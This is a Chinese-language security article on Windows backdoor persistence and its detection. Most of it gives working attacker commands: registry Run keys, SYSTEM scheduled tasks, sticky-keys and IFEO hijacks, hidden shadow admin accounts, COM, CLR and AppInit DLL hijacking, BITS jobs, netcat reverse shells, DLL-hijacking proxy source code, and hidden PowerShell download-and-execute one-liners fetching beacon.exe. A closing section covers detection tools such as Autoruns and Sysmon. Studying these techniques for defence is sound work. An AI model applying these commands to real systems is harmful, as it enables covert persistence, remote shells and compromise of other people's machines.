## 一.windows后门

### 1.开机自启动项

(1)自启动目录

    
    
    %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    

排查该两处目录下是否有可疑自启动文件。

(2)注册表

    
    
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    

![image](https://image.3001.net/images/20221209/1670574273_6392f0c1e4c9e40d4a321.png!small)

    
    
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
    

![image](https://image.3001.net/images/20221209/1670574303_6392f0df244c1702efae6.png!small)

    
    
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    

![image](https://image.3001.net/images/20221209/1670574324_6392f0f499bb1e2f6e0af.png!small)

    
    
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
    

![image](https://image.3001.net/images/20221209/1670574336_6392f100e3e2be077cc45.png!small)

**注册表位置**

    
    
    用户级
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
    系统级
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
    

### 2.自启动服务

services.msc  
![image](https://image.3001.net/images/20221209/1670574356_6392f114b078626efc45b.png!small)  
查看是否有可以自启动服务。

    
    
    sc create "Server Name"  binpath= "c:\\windows\\a.exe" //创建服务 在命令中，=号前面不能有空格，而=号后面必须有一个空格sc description KeyName "eval file"  //服务的描述
    sc config KeyName start=auto //设置服务自启动
    sc qc "Server Name" //查看该服务的详细信息
    net start "Server Name" //启动该服务
    net start //查看所有启动的服务
    icacls "c:\\windows" //查看该windows目录的执行权限
    

![image](https://image.3001.net/images/20221209/1670574393_6392f1392fd38370ff341.png!small)

### 3.计划任务

![image](https://image.3001.net/images/20221209/1670574423_6392f157a757c7ad512a1.png!small)

    
    
    schtasks /create /tn test /sc onstart /tr C:\shell.bat /ru system /f:在主机上创建名为test的计划任务
    schtasks /run /i /tn "test":运行主机上的test计划任务
    schtasks /delete /tn "test" /f:删除主机上的test计划任务(schtasks >=2008)
    /ru 指定运行任务的用户权限，这里指定为最高的 SYSTEM，/tn 是任务名称，/sc 是任务运行频率，这里指定为每天运行
    /tr 指定运行的文件，/F 表示如果指定的任务已经存在，则强制创建任务并抑制警,其中/i 表示立即运行
    

![image](https://image.3001.net/images/20221209/1670574441_6392f1696a6c803e07b8f.png!small)

schtasks //查看所有计划任务

![image](https://image.3001.net/images/20221209/1670574467_6392f183ee07279288bef.png!small)

### 4.登陆脚本

本地组策略编辑器->计算机配置->Windows设置->脚本(启动/关机)  
![image](https://image.3001.net/images/20221209/1670574490_6392f19ae80b36a4b6050.png!small)

每次开机/关机会执行的脚本文件。

### 5.文件打开关联

 **windows中txt文件默认以notepad打开，**

    
    
    assoc .txt //查看txt文件关联的文件类型。
    

![image](https://image.3001.net/images/20221209/1670574534_6392f1c6c83f74ded36f7.png!small)

    
    
    ftype txtfile //查看打开txt的应用程序
    

![image](https://image.3001.net/images/20221209/1670574551_6392f1d7743a2438cece0.png!small)

    
    
    assoc .txt=txtfile  设置txt文件关联类型
    ftype txtfile=c:\windows\notepad.exe %1 设置打开txt的应用程序
    
    注册表路径为：HKCR\txtfile\shell\open\command
    

### 6.用户登陆初始化(userinit)

用户登陆的时候，WinLogon 会启动HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
的UserInit表键下指定的程序（默认为 userinit.exe）。UserInit 进程执行登录和初始化脚本，然后启动 Shell 表键中定义的
Shell程序，默认即是 Explorer.exe。但是，注册表的键值支持多个进程，这就给了我们机会。

### 7.UserInitMprLogonScript

UserInitMprLogonScript加载优先级高，先于大多数启动项(包括杀软)。

    
    
    HKEY_CURRENT_USER\Environment创建一个键为：UserInitMprLogonScript，其键值为我们要启动的程序路径(可以加载一个恶意exe文件，充当后门)
    

![image](https://image.3001.net/images/20221209/1670574607_6392f20f4f967e073122c.png!small)

### 8.屏幕保护程序

    
    
    假设目标主机开启屏幕保护，我们可以修改、替换屏保程序来启动我们的恶意程序。 
    屏幕保护的配置位置：HKEY_CURRENT_USER\Control Panel\Desktop，主要键值：
    SCRNSAVE.EXE，默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序
    ScreenSaveActive，1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态
    ScreenSaverTimeout，指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900(15分钟)
    

### 9.程序替换(shift后门)

    
    
    在系统登录界面可以以特定方式运行系统程序，例如连续按shift五次即可运行 C:\WINDOWS\system32\sethc.exe，攻击者可以使用木马后门程序替换该文件。可以替换该程序为cmd.exe(名字还是需要设置为sethc.exe)，则按5次shift之后会调用cmd窗口
    
    C:\Windows\System32\utilman.exe 设置中心 快捷键：Windows+U 键
    C:\Windows\System32\osk.exe 屏幕键盘
    C:\Windows\System32\Magnify.exe 放大镜 快捷键：Windows+加减号
    

![image](https://image.3001.net/images/20221209/1670574636_6392f22c1877004eb9ce1.png!small)

### 10.映像劫持

    
    
    对于在Windows Vista和Windows Server 2008 及更高的版本中，替换的二进制文件受到了系统的保护，无法使用经典的shift后门。映像劫持也被称为“IFEO”（Image File Execution Options），简单来说就是当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序。 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File  Execution Options\ 添加一个项sethc.exe，然后在sethc.exe这个项中添加debugger键，键值为我们恶意程序的路径
    

![image](https://image.3001.net/images/20221209/1670574655_6392f23feed7c017a2284.png!small)

连按5次shift键之后会打开cmd窗口。

### 11.Netsh helper

netsh(全称:Network
Shell)是windows系统本身提供的功能强大的网络配置命令行工具，它可以添加自定的dll从而拓展其功能，我们可以使用netsh add helper
yourdll.dll来添加拓展功能，添加了之后，在启动netsh的时候就会加载我们dll文件

    
    
    通过cmd添加helper
    netsh add helper c:\windows\calc.dll //需要管理员执行
    

![image](https://image.3001.net/images/20221209/1670574675_6392f253d251b8b1bcfd5.png!small)

    
    
    通过注册表添加helper
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh
    

![image](https://image.3001.net/images/20221209/1670574867_6392f313b0c4df3b97231.png!small)

### 12.com劫持

    
    
    com组件会根据以下路径去寻找
    HKCU\Software\Classes\CLSID 
    HKCR\CLSID HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\shellCompatibility\Objects\
    那么我们如果想要进行com劫持，肯定挑选的是首先寻找的路径，即HKCU\Software\Classes\CLSID，我们可以直接在CLSID下新建一个对象ID，与dll劫持不同的是，dll劫持只能劫持dll，局限性比较大，但是com组件能够劫持如.com文件、pe文件、api文件等等
    

**参考链接:https://cloud.tencent.com/developer/article/1891489**

### 13.影子账户

net user test$ 123.com /add //创建用户的时候，在用户名后面跟上$，net user是查看不到的  
![image](https://image.3001.net/images/20221209/1670575212_6392f46c2609f8e465eaa.png!small)  
net localgroup administrators test$ /add //将该用户添加到管理员组  
![image](https://image.3001.net/images/20221209/1670575232_6392f480a7f958561c7dd.png!small)  
在本地用户和组是可以看到的。  
![image](https://image.3001.net/images/20221209/1670575249_6392f4918690033df1d17.png!small)  
注册表中也可以查看到。\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names

首次查看需要给SAM目录权限。

单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可  
![image](https://image.3001.net/images/20221209/1670575296_6392f4c0c709280a0d8e8.png!small)

![image](https://image.3001.net/images/20221209/1670575319_6392f4d7b4be23b87b899.png!small)

将该隐藏用户创建为影子账户。

Administrator账户所对应类型为0x1f4，则对应Users下的000001F4  
![image](https://image.3001.net/images/20221209/1670575462_6392f5669527eb3cb041a.png!small)

test$账户所对应类型为0x3f0，则对应Users下的000003F0  
![image](https://image.3001.net/images/20221209/1670575487_6392f57f4d899fadd4c73.png!small)  
将test$导出，命名为1.reg

将000003F0导出，命名为2.reg

将000001F4导出，命名为3.reg  
![image](https://image.3001.net/images/20221209/1670575525_6392f5a51581283af7b6e.png!small)

然后使用3.reg中F的值替换2.reg中的F的值。(相当于administrators的F替换test$的F值)  
![image](https://image.3001.net/images/20221209/1670575546_6392f5bad1531f2a614b9.png!small)  
然后删除test$用户。 net user test$ /del

![image](https://image.3001.net/images/20221209/1670575567_6392f5cf89c9fef6c64f9.png!small)  
此时注册表中已经没有了test$用户。  
![image](https://image.3001.net/images/20221209/1670575584_6392f5e075ff4f3b2f9a3.png!small)  
然后导入1.reg和2.reg(文件->导入)  
![image](https://image.3001.net/images/20221209/1670575600_6392f5f0352031b4a2541.png!small)  
导入成功之后。在计算机管理的本地用户和组已经看不到test$用户。  
![image](https://image.3001.net/images/20221209/1670575615_6392f5ffcdb2fa9849b9e.png!small)net
user test$ //查看test$用户信息。

![image](https://image.3001.net/images/20221209/1670575631_6392f60f86d46fa6df53f.png!small)  
但是注册表还是可以看到test$用户。  
![image](https://image.3001.net/images/20221209/1670575647_6392f61fcf3d78e560336.png!small)  
net user test$ /del //此时该命令也删除不了test$用户，只能注册表去删除。  
![image](https://image.3001.net/images/20221209/1670575664_6392f6300c7689c67407d.png!small)

 **所以排查影子账户只能在注册表处排查。**

### 14.waitfor

waitfor:在系统上发送或等待信号。waitfor可用于跨网络同步计算机。

    
    
    waitfor test && c:\\windows\\eval.exe 表示接收信号成功后执行恶意exe程序
    waitfor /s 192.1.1o /u qiyou /p qiyou /si test   //向机器192.168.1.10发送信息，让其执行恶意程序
    
    /s <Computer>  指定远程计算机的名称或IP地址，默认为本地计算机 
    /u [<Domain>]<user>    使用指定用户帐户的凭据运行脚本。默认是使用当前用户的凭据。 
    /p <Password>  指定/u参数中指定的用户帐户的密码。 
    /si            发送指定激活信号。 
    /t             指定等待信号的秒数。默认为无限期等待。 
    <SignalName>    指定等待或发送的信号，不区分大小写，长度不能超过225个字符
    

### 15.CRL

 **CLR(公共语言运行库,Common Language
Runtime)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。CLR的核心功能包括：内存管理、程序集加载、安全性、异常处理和线程同步，可由面向CLR的所有语言使用。并保证应用和底层操作系统之间必要的分离。CLR是.NET
Framework的主要执行引**

需要注意的是CLR能够劫持系统中全部.net程序，而且系统默认会调用.net程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路，下面来进行演示实现。

    
    
    注册表路径：HKEY_CURRENT_USER\Software\Classes\CLSID\，
    新建子项{11111111111111111111-111111}（名字随便，只要不与注册表中存在的名称冲突就行），
    然后再新建子项InProcServeR32，(r是小写，r跟32被检测为敏感字符，所以改为了大写)
    新建一个键ThreadingModel，键值为：Apartment，
    默认的键值为我们dll的路径
    

![image](https://image.3001.net/images/20221209/1670575689_6392f649212afc728e01b.png!small)

**然后在cmd下设置一下：**

 **PS：要注册为全局变量，不然只能在当前cmd窗口劫持.net程序**

    
    
    SETX COR_ENABLE_PROFILING=1 /M
    SETX COR_PROFILER={11111111111111111111-111111} /M
    

### 16.AppInit_DLLS

UseR32.dll(r为小写，原因同上)被加载到进程时，会先获取注册表AppInit_DLLs，如果有值，调用LoadLibrary()
去加载用户设定的dll，而UseR(r为小写)32.dll又是windows中非常基础、使用率极高的dll文件。

简单的说就是：AppInit_DLLs用来全局注入dll模块，凡是导入了useR(r为小写)32.dll的程序都会主动加载这个键值下的模块。

    
    
    其注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs，
    把AppInit_DLLs的键值设置为我们dll路径，将LoadAppInit_DLLs设置为1
    

![image](https://image.3001.net/images/20221209/1670575708_6392f65c645d89fd30285.png!small)

### 17.同名com程序

如果一个路径下同时包含同名的exe和com文件，例如test.exe和test.com，通过命令行cmd输入
test（不包含文件后缀名），会优先运行com文件，即test.com。
我们将calc.exe改名为cmd.com，且与cmd.exe放在同一目录下，在CMD中执行cmd命令  
![image](https://image.3001.net/images/20221209/1670575723_6392f66b207ac778ebfb6.png!small)

### 18.inf后门

    
    
    结合Windows开机安装服务PendingGPOs实现开机执行。具体步骤：
    在注册表：HKEY_CURRENT_USER\Software\Microsoft\ 
    处依次新建子项：\IEAK\GroupPolicy\PendingGPOs
    然后再新建几个键，如下： 
    键：Count，类型：REG_DWORD，键值：1 
    键：Path1，类型：REG_SZ，键值：C:\Users\Administrator\Desktop\test\calc.inf //inf文件路径
    键：Section1，类型：REG_SZ，键值：DefaultInstall
    

![image](https://image.3001.net/images/20221209/1670575742_6392f67e8eac472f1fdbf.png!small)  
输入账号密码登陆即开始加载该calc.inf文件，先于大部分软件。

### 19.BITS

 **BITS (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应
用程序获得响应而调整传输速度，并在重新启动计算机之后自动恢复文件传输。在win7及之后系统⾃带。**

    
    
    常见的bitsadmin命令 
    bitsadmin /create [type] DisplayName //创建一个任务 
    bitsadmin /cancel  //删除一个任务 
    bitsadmin /list /allusers /verbose //列出所有任务 
    bitsadmin /AddFile    //给任务test添加一个下载文件 
    bitsadmin /SetNotifyCmdLine   [ProgramParameters] //设置在任务完成传输时或任务进入状态时将运行的命令行命令。 
    bitsadmin /Resume  //激活传输队列中的新任务或挂起的任务。 
    bitsadmin /cancel  //删除某个任务 
    bitsadmin /reset /allusers //删除所有任务 
    bitsadmin /complete  //完成某个任务
    
    bitsadmin /create test //创建名为test的任务
    bitsadmin /addfile test c:\windows\system32\calc.exe c:\Users\test\Desktop\calc.exe //文件复制
    bitsadmin /SetNotifyCmdLine test cmd.exe "cmd.exe /c calc.exe" //进入任务状态执行命令
    bitsadmin /resume test //开始任务
    

![image](https://image.3001.net/images/20221209/1670575851_6392f6eb8010e860ba6d3.png!small)

    
    
    bitsadmin /list //查看任务，/verbose 参数可以查看详细信息
    

![image](https://image.3001.net/images/20221209/1670575868_6392f6fc806dd0a9932fc.png!small)

    
    
    bitsadmin /complete qwe //完成任务，设定的文件复制动作将会被执行
    只要不用命令bitsadmin /complete qwe将任务完成，那么每次重启后几分钟内设置的命令就会执行一次，且会重复三次，即间隔几分钟再次执行我们设定的命令。
    执行该命令之后，calc.exe也会被复制到桌面
    

![image](https://image.3001.net/images/20221209/1670575978_6392f76a5b23b0a3868df.png!small)

### 20.快捷方式加载

替换被攻击主机桌面快捷方式实际指向应用程序。以远程桌面快捷方式为例，  
![image](https://image.3001.net/images/20221209/1670576048_6392f7b00155dbae921c1.png!small)  
将目标处的%windir%\system32\mstsc.exe替换为%windir%\system32\cmd.exe /c
calc.exe&mstsc.exe  
![image](https://image.3001.net/images/20221209/1670576063_6392f7bf381c2cb9482d7.png!small)  
打开远程桌面快捷方式，即可同时打开计算机。  
![image](https://image.3001.net/images/20221209/1670576090_6392f7dac4dd87ff08d8b.png!small)

### 21.attrib

    
    
    attrib 
    \+ 设置属性。
    \- 清除属性。
    R 只读文件属性。
    A 存档文件属性。
    S 系统文件属性。
    H 隐藏文件属性。
    I 无内容索引文件属性。
    X 无清理文件属性。
    V 完整性属性
    attrib +s +a +h +r 1.txt 增加系统文件属性、只读文件属性等即使查看隐藏文件也看不见
    

![image](https://image.3001.net/images/20221209/1670576140_6392f80c6ff88999d3fab.png!small)

![image](https://image.3001.net/images/20221209/1670576154_6392f81aae5a7d2586bdc.png!small)

可以看到，执行attrib +s +a +h +r 1.txt命令后，文件就会隐藏起来，点击查看隐藏的项目也查看不到。

但是dir /a可以查看到。  
![image](https://image.3001.net/images/20221209/1670576202_6392f84a2a75782d19d74.png!small)

attrib -s -a -h 1.txt //取消掉1.txt的隐藏属性。  
![image](https://image.3001.net/images/20221209/1670576218_6392f85a0a84ac6dd98c0.png!small)

## 二.windows后门常见技术

### 1.nc反弹shell

    
    
    服务器下监听：nc -lvvp 8888
    

![image](https://image.3001.net/images/20221209/1670576234_6392f86acfdee7e439c56.png!small)

    
    
    向服务器反弹shell
    linux   nc ip port -e /bin/bash
    windows  nc ip port -e c:\windows\system32\cmd.exe
    

![image](https://image.3001.net/images/20221209/1670576269_6392f88d8a17380c58306.png!small)

可以看到服务器已经收到了反弹过来的shell.  
![image](https://image.3001.net/images/20221209/1670576284_6392f89c616e009a93439.png!small)

### 2.Dll注入

  1. 远程线程注入

  2. APC注入

  3. 注册表注入

  4. ComRes注入

  5. 劫持进程创建注入

  6. 输入法注入

  7. 消息钩子注入

  8. 依赖可信任进程注入

 **具体方法可以参考文章：https://blog.csdn.net/Cody_Ren/article/details/100053434**

### 3.dll劫持

#### 3.1dll简介

DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。
在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件。

在windows平台下，很多应用程序的很多功能是相似的，抛去ui等等来说，大致的功能都差不多，比如都得调用窗口，都得调用内存管理的模块来分配内存，都得调用io模块去进行文件操作，读写文件等等，这些模块的具体表现就是DLL文件。

Windows操作系统通过“DLL路径搜索目录顺序”和“Know
DLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。

#### 3.2dll路径搜索目录顺序

    
    
    1.程序所在目录
    2.程序加载目录（SetCurrentDirectory）
    3.系统目录即 SYSTEM32 目录
    4.16位系统目录即 SYSTEM 目录
    5.Windows目录
    6.PATH环境变量中列出的目录
    

**Know DLLs注册表项**

    
    
    Know DLLs注册表项里的DLL列表在应用程序运行后就已经加入到了内核空间中，多个进程公用这些模块，必须具有非常高的权限才能修改。
    Know DLLs注册表项的路径为HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
    

使用Process Monitor查看打开notepad++时加载的dll文件。

![image](https://image.3001.net/images/20221209/1670576303_6392f8afe411b9a20eebd.png!small)

##### (1)劫持缺失的dll文件

查找需要加载的，但是没有找到的dll文件。  
![image](https://image.3001.net/images/20221209/1670576318_6392f8be845a8538d904f.png!small)

需要加载该C:\Windows\System32\wow64log.dll，但是未找到。

通过visual去生成一个弹出计算机的dll文件。  
![image](https://image.3001.net/images/20221209/1670576334_6392f8cee58e3a2b2000c.png!small)

然后将该dll命名为wow64log.dll，并放在该目录下C:\Windows\System32。  
![image](https://image.3001.net/images/20221209/1670576349_6392f8dd17e5dbe5090e6.png!small)

运行notepad++程序。可以看到同时弹出来计算器。  
![image](https://image.3001.net/images/20221209/1670576363_6392f8eb00cb79190b016.png!small)

##### (2)劫持存在的dll文件

可以看到该SciLexer.dll文件，是被成功加载的。然后去劫持该dll文件。  
![image](https://image.3001.net/images/20221209/1670576380_6392f8fc643aaa5995be2.png!small)

可以直接使用弹框的dll替换SciLexer.dll文件，会执行计算器，但notepad++会执行不了，报错，隐藏性不高。  
![image](https://image.3001.net/images/20221209/1670576395_6392f90b6d49bdd8d52fc.png!small)

可以使用dll转发的方式，dll转发顾名思义，就是要保留原来的dll，再生成一个恶意的dll执行代码，代码如下。

    
    
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    # include "pch.h"
    # include <stdlib.h>
    
    extern "C" __declspec(dllexport) void Scintilla_DirectFunction();
    
    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD  ul_reason_for_call,
        LPVOID lpReserved
    )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            system("calc");
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    
    void Scintilla_DirectFunction()
    {
        HINSTANCE hDll = LoadLibrary(L"SciLexer_re.dll");
        if (hDll)
        {
            //typedef 是定义了一个新的类型
            //DWORD是双字类型 4个字节,API函数中有很多参数和返回值是DWORD
            //定义了类型EXPFUNC，并且返回类型是DWORD的函数的指针
            typedef DWORD(WINAPI* EXPFUNC)();
            EXPFUNC expFunc = NULL;
            expFunc = (EXPFUNC)GetProcAddress(hDll, "Scintilla_DirectFunction");
            if (expFunc)
            {
                expFunc();
            }
        }
        return;
    }
    

然后把原dll改名为SciLexer_re.dll，并将生成的恶意dll改名为SciLexer.dll。  
![image](https://image.3001.net/images/20221209/1670576414_6392f91ec1e22d393af49.png!small)  
然后打开notepad++  
![image](https://image.3001.net/images/20221209/1670576427_6392f92b3c12910f90fc1.png!small)

 **使用工具进行dll转发。**

对QQ进行dll劫持，使其运行是打开计算器。

这里还是使用导入表进行劫持，首先用cff(下载地址:https://ntcore.com/files/CFF_Explorer.zip)打开QQ.exe的导入表，找一个不在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session
Manager\KnownDLLs路径里面的dll进行劫持，因为在这个路径里面的dll是优先加载的，加载之后已经进入内核空间，想要劫持难度很大。这里我选择的是libuv.dll进行劫持。  
![image](https://image.3001.net/images/20221209/1670576465_6392f951c1ccc0cf95e9b.png!small)

然后使用到aheadlib这个工具，输入dll就填QQ.exe路径下的`libuv.dll`，输出CPP会自动生成，原始DLL的名称要记住，等下会替换  
![image](https://image.3001.net/images/20221209/1670576484_6392f9644e43bc7869c58.png!small)

点击生成，生成一个cpp文件。  
![image](https://image.3001.net/images/20221209/1670576498_6392f972aa77bfa796674.png!small)

打开该文件，会看到一个入口函数。  
![image](https://image.3001.net/images/20221209/1670576515_6392f9837dd25a7c125bf.png!small)

新建一个vs dll项目，然后将.cpp的代码复制进去，并加上`<windows.h>`和`<stdlib.h>`头文件  
![image](https://image.3001.net/images/20221209/1670576529_6392f991819f0b91543dc.png!small)

然后在入口函数的地方填上一个弹出计算器的语句  
![image](https://image.3001.net/images/20221209/1670576545_6392f9a1b843af418a3bb.png!small)  
将原dll文件改名为之前在软件里面复制的名字`libuvOrg.dll`，并把我们生成的dll文件复制进去并命名为libuv.dll。  
![image](https://image.3001.net/images/20221209/1670576560_6392f9b029ac7a4fbb620.png!small)  
点击QQ.exe即可弹出calc.exe  
![image](https://image.3001.net/images/20221209/1670576576_6392f9c062b454b3345d7.png!small)  
`参考链接:https://cloud.tencent.com/developer/article/1951503`

### 4.无文件代码执行(powershell)

    
    
    下载文件到磁盘并执行
    powershell -w hidden -exec bypass -c (New-Object System.Net.WebClient).DownloadFile('<文件下载地址>','<文件保存地址>');<命令>
    powershell -w hidden -exec bypass -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.133.128/beacon.exe','c:/Windows/Temp/beacon.exe');c:/Windows/Temp/beacon.exe
    -w hidden参数会触发火绒弹框(取消该参数不会弹框，但是不会关闭掉powershell窗口)
    
    下载不落地文件并执行
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('<文件下载路径>'))"
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.133.128:80/a.ps1'))"
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.133.128:80/a.exe'))";a.exe //执行a.exe
    

## 三.后门排查工具

#### 1.PCHunter

一个多功能安全工具，类似的应用还有火绒剑，YDArk。  
![image](https://image.3001.net/images/20221209/1670576599_6392f9d78a08201429266.png!small)  
鼠标右键选择校验所有数字签名。  
![image](https://image.3001.net/images/20221209/1670576615_6392f9e76c25eafd9b93c.png!small)

    
    
    黑色：微软签名的驱动程序； 
    蓝色：非微软签名的驱动程序； 
    红色：驱动检测到的可疑对象，隐藏服务、进程、 被挂钩函数
    

重点排查红色项。

还可以查看启动信息等。  
![image](https://image.3001.net/images/20221209/1670576674_6392fa22c95cc38d6f7a3.png!small)

#### 2.PowerTool

PowerTool
帮助你找出病毒木马在你的电脑中动过的手脚，并去除病毒设下的机关，目前具备以下功能模块：系统修复、进程管理、内核模块、内核相关、钩子、应用层、文件、注册表、离线分析、启动项、系统服务、网络、漏洞修复、硬件温度检测等。

PowerTool
的特色在于它们能够获取较高权限，从而执行一些底层的系统维护操作，如常用的强制结束进程、强制删除文件、强制编辑注册表、强制删除系统服务等等。作为一款内核级手动杀毒辅助工具，  
![image](https://image.3001.net/images/20221209/1670576705_6392fa41b19e2f3127f4c.png!small)

### 3\. Autoruns

红色代表数字签名异常的程序，因此需要重点关注  
![image](https://image.3001.net/images/20221209/1670576720_6392fa50d8137399aa4de.png!small)

该工具可以排查Logon后门、镜像劫持，等后门  
![image](https://image.3001.net/images/20221209/1670576736_6392fa6034ef83ff43962.png!small)  
Winlogon查看  
![image](https://image.3001.net/images/20221209/1670576747_6392fa6bec262563ec7d5.png!small)

### 4\. ProcessMonitor

Process Monitor是微软推荐的一款系统监视攻击，能供实时显示文件系统、注册表、网络连接、进程活动、配置事件的攻击工具  
首先配置过滤的规则。  
![image](https://image.3001.net/images/20221209/1670576761_6392fa797e18948e90a8f.png!small)  
然后就可以查看对应文件所作的操作等。  
![image](https://image.3001.net/images/20221209/1670576774_6392fa86532f1a0180432.png!small)

### 5.TCPView

查看网络连接  
![image](https://image.3001.net/images/20221209/1670576790_6392fa96d44f69f3079d7.png!small)

### 6.LiveTcpUdpWatch

查看网络链接，结果更详细。  
![image](https://image.3001.net/images/20221209/1670576805_6392faa5ce7835567f4fd.png!small)

### 7.Process Hacker

Process
Hacker是一款针对高级用户的安全分析工具，它可以帮助研究人员检测和解决软件或进程在特定操作系统环境下遇到的问题。除此之外，它还可以检测恶意进程，并告知我们这些恶意进程想要实现的功能。  
![image](https://image.3001.net/images/20221209/1670576820_6392fab4a6cdea774ac62.png!small)

### 8.Sysmon

Sysmon是由Windows
Sysinternals出品的一款Sysinternals系列中的工具。系统监视器（Sysmon）是Windows系统服务和设备驱动程序，一旦安装在系统上，便会驻留在系统重新引导期间，以监视系统活动并将其记录到Windows事件日志中。它提供有关进程创建，网络连接以及文件创建时间更改的详细信息。可以使用相关日志收集工具，收集事件并随后对其进行分析，可以识别恶意或异常活动，并了解入侵者和恶意软件

    
    
    • 安装  Sysmon.exe -i
    • 指定规则安装（sysmonshell生成规则）Sysmon.exe -accepteula -i Sysmonconfig-export.xml
    • 更新配置文件 Sysmon.exe -c Sysmonconfig-export.xml
    • 卸载  Sysmon.exe -u
    监控日志：事件查看器(eventvwr.msc)-->应用程序和服务日志-->Microsoft-->Windows- >Sysmon-->Operationa
    

### 9.其他

    
    
    从注册表获取痕迹：ShimCache、UserAssist、muicache
    文件痕迹：Windows Prefetch、Amcache / RecentFileCache.bcf
    ShimCache：如果一个文件以Windows进程的形式执行过，那么它的信息将会被记录到ShimCache中，但是ShimCache中记录的文件信息并不能100%证明一个文件执行过，因为它只能证明Windows曾与该文件交互过。HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
    
    UserAssist ：UserAssist键值包含GUI应用执行的信息，UserAssist键能够追踪文件的最后一次执行时间以及执行次
    数
    当前用户 ：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
    所有用户 ：HKEY_USERS\<sid>\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
    
    Muicache：每次开始使用新的应用程序时，Windows都会自动从exe文件的版本资源中提取应用程序名，并将其存储
    在名为MuiCache的注册表项。
    当前用户：HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache
    所有用户：HKEY_USERS\<sid>\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache
    
    Windows Prefetch：
    reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory 
    Management\PrefetchParameters" /v EnablePrefetcher
    
    Amcache / RecentFileCache.bcf
    Windows中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行
    的时间和最后修改时间。
    win7、windows server 2008R2等：
    C:\Windows\AppCompat\Programs\RecentFileCache.bcf
    
    win8、win10、windows server 2012等：
    C:\Windows\AppCompat\Programs\Amcache.hve
    

